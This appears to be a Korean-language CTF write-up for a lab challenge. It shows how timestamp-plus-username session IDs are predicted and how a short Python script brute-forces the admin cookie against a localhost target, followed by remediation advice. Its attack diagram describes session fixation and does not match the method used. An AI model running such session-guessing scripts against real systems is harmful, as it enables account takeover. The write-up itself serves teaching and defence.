+++
title = "VulnABLE CTF [LUXORA] Write-up: Session Attacks 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Session Attack", "Silver", "Session Prediction", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Session Attacks 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (Session Attacks)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/session/silver`
- **목표**: 세션 고정 취약점은 패치되었으나, 발급되는 세션 ID의 생성 규칙(알고리즘)이 취약한 점을 노려(Session Prediction), 관리자(Admin)의 세션 쿠키를 예측하고 권한을 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/session/silver` 에 접속하여 로그인 창을 띄웁니다.
이번에는 여러 번 로그아웃과 로그인을 반복하며, 서버가 발급해주는 `session_id` 쿠키의 패턴을 수집(Harvesting)합니다.

**[수집한 세션 ID 목록]**
1. `session_id=1698800000_user1`
2. `session_id=1698800015_user1`
3. `session_id=1698800040_guest`

**[해커의 사고 과정]**
1. 세션 ID가 무작위(Random)로 보이지 않는다.
2. 뒷부분은 명확하게 로그인한 유저의 이름(`user1`, `guest`)이다.
3. 앞부분의 숫자 10자리는 무엇일까? 숫자의 증가 폭을 보니 1970년부터의 초를 세는 **UNIX Timestamp (Epoch Time)**가 확실하다.
4. 즉, 세션 ID 생성 공식은 `[로그인한 시간의 Unix Timestamp]_[유저명]` 이다.
5. 관리자(admin)가 이 서버에 로그인한 대략적인 시간대만 알면, 관리자의 세션 ID를 역산해낼 수 있겠군!

---

## 💥 2. 취약점 식별 및 데이터 추출 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Inject Session ID)--> [ Victim's Browser ]
[ Victim ]   --(Logs In)------------> [ Web Server ]
[ Attacker ] --(Uses Same Session)-> [ Web Server ]
                                     |-- Logged in as Victim!
```


관리자의 로그인 시간을 알아내기 위해 시스템을 탐색합니다.
게시판이나 공지사항(Notice) 게시글에서 다음과 같은 글을 발견합니다.

**[Notice Board]**
> "System rebooted and Admin logged in to check the status. (Posted on: 2023-11-01 10:00:00 UTC)"

### 💡 타겟 세션 예측 (Session Prediction)
관리자(`admin`)가 `2023-11-01 10:00:00 UTC` 에 로그인했다는 강력한 힌트입니다.
이 시간을 Unix Timestamp로 변환해 봅니다. (온라인 변환기나 쉘 스크립트 이용)

```bash
$ date -u -d "2023-11-01 10:00:00" +"%s"
1698832800
```

이 시간을 바탕으로 타겟이 될 관리자의 세션 ID를 유추합니다.
- `session_id=1698832800_admin`

하지만 서버 환경이나 네트워크 지연에 따라 1~2초 정도 오차가 있을 수 있습니다. 따라서 `1698832790_admin` 부터 `1698832810_admin` 까지 약 20개의 세션 ID를 후보군으로 잡습니다.

---

## 🚀 3. 공격 수행 및 자동화 스크립트 작성

20개의 세션을 일일이 브라우저에 넣어보는 대신, 파이썬 스크립트를 짜서 자동으로 대입해(Brute-force) 관리자 페이지 접속을 시도합니다.

```python
import requests

url = "http://localhost:3000/session/silver/dashboard"
base_time = 1698832800

print("[*] Starting Session Prediction Attack...")

for offset in range(-10, 11): # -10초부터 +10초까지 오차 범위 테스트
    target_time = base_time + offset
    predicted_session = f"{target_time}_admin"
    
    cookies = {"session_id": predicted_session}
    res = requests.get(url, cookies=cookies)
    
    # 200 OK이거나 관리자 환영 메시지가 있으면 성공
    if "Welcome, Administrator" in res.text:
        print(f"[+] Success! Admin Session ID Found: {predicted_session}")
        print(f"[+] Flag: {res.text.split('FLAG{')[1].split('}')[0]}")
        break
```

### 🔍 서버의 응답 및 공격 결과
스크립트를 실행하면 몇 초 뒤에 정확한 관리자 세션을 찾아내고 플래그를 뱉어냅니다!

```text
[*] Starting Session Prediction Attack...
[+] Success! Admin Session ID Found: 1698832802_admin
[+] Flag: SESSION_🥈_PREDICT_TIME_E5F6G7
```
*(실제 로그인된 시간은 정각에서 2초 늦은 1698832802 였습니다.)*

---

## 🚩 4. 롸잇업 결론 및 플래그

세션 ID를 난수화하지 않고 예측 가능한 값(시간, 유저명 등)의 조합으로 만들었을 때, 공격자가 정보 수집을 통해 관리자의 세션을 통째로 추측(Guessing)하여 빼앗는 과정을 시연했습니다.

**🔥 획득한 플래그:**
`FLAG{SESSION_🥈_PREDICT_TIME_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
세션 ID는 오직 사용자를 식별하는 "티켓"이어야 하며, 그 자체에 의미 있는 정보(시간, 아이디 등)가 포함되어서는 안 됩니다.

* **취약한 세션 발급 코드**
```javascript
// 예측하기 너무 쉬운 규칙
const sessionId = Math.floor(Date.now() / 1000) + "_" + req.body.username;
res.cookie('session_id', sessionId);
```

* **안전한 패치 가이드 (CSPRNG 사용)**
세션 ID는 반드시 암호학적으로 안전한 난수 생성기(CSPRNG, Cryptographically Secure Pseudo-Random Number Generator)를 통해 생성된, 최소 128비트 이상의 길이를 가진 무작위(Random) 문자열이어야 합니다.
직접 만들지 말고, 프레임워크가 제공하는 안전한 내장 세션 관리자(예: Node.js의 `express-session`, Spring의 `HttpSession`)를 사용하는 것이 표준입니다.

```javascript
// express-session 설정 예시 (내부적으로 안전한 UUID/난수 세션 ID 생성)
app.use(session({
  secret: 'very_strong_random_secret_key',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: true, httpOnly: true }
}));